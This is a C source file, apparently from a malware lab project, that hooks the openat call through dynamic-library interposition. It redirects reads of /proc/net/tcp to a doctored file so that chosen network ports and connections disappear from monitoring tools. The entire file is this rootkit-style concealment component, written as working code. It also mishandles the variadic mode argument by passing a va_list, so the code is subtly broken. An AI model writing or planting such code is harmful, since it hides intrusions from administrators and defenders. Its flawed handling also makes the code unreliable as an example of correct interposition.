#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

static int (*original_openat)(int dirfd, const char *pathname, int flags, ...) = NULL;

int openat(int dirfd, const char *pathname, int flags, ...) {
    // Load the original openat function if not loaded
    if (!original_openat) {
        original_openat = dlsym(RTLD_NEXT, "openat");
        if (!original_openat) {
            fprintf(stderr, "Error: Unable to load original openat function\n");
            return -1;
        }
    }

    // Check if the file being opened is /proc/net/tcp
    if (strcmp(pathname, "/proc/net/tcp") == 0) {
        // Replace the path with /home/kali/Malware/project/hide_port/tcp
        pathname = "/home/kali/Malware/project/hide_port/tcp";
    }

    // Call the original openat function
    va_list args;
    va_start(args, flags);
    int result = original_openat(dirfd, pathname, flags, args);
    va_end(args);

    return result;
}